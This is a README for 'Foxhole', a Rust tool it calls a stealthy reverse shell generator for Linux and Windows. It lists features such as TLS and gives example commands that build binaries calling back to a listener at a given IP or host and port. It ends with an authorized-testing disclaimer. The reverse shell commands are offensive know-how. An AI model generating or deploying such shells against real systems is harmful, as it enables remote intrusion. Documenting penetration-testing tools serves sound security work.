# Foxhole

A stealthy, cross-platform reverse shell generator written in Rust.

## Features

- Cross-platform support (Linux and Windows)
- TLS encryption support
- Customizable shell path
- Minimal and fast binaries
- Release mode compilation for smaller size

## Usage

```bash
foxhole --ip <target_ip> --port <target_port> --os <linux|windows> [--shell <shell_path>] [--tls] --output <output_path>
```

### Examples

Generate a Linux reverse shell:
```bash
foxhole --ip 192.168.1.100 --port 4444 --os linux --output shell
```

Generate a Windows reverse shell with TLS:
```bash
foxhole --ip example.com --port 443 --os windows --tls --output shell.exe
```

Generate a custom shell path:
```bash
foxhole --ip 192.168.1.100 --port 4444 --os linux --shell /bin/bash --output shell
```

## Requirements

- Rust toolchain (latest stable)
- `rustc` compiler
- For cross-compilation: `cross` (optional)

## Security Note

This tool is for educational and authorized testing purposes only. Unauthorized use on systems you don't own or have permission to test is illegal. 